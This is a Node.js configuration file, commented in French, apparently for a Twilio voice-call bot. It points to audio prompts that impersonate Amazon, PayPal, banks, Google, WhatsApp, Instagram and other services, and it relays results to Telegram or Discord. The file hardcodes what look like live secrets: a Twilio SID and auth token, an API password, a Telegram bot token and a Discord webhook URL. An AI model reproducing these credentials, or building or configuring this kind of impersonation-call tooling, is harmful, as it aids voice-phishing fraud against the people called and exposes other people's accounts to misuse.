module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'ACd17f9bf51ee0df5c61a318325275901b',
    authToken: '335fa07178d8c22d965b31aaec235cd1',
    callerid: '+18065457860',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'Hanaffypab087$&!lo',
    serverurl: 'https://rooster-equal-privately.ngrok-free.app',

    /**
     * Informations à propos du webhook discord
     */
    telegramChatId: '7357374379',
    telegramBotToken: '7752462830:AAEMJ8FGgikb4Il6cXJO-tsp-LAxghfpZUI',
  //  discordwebhook: 'https://discord.com/api/webhooks/1161351246536519831/AsK0orHR3trAafdS-53H_WtzHLPmCjEsRFs5P_KV518CGhc4imMAGwO77bOIltvY_1mt',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
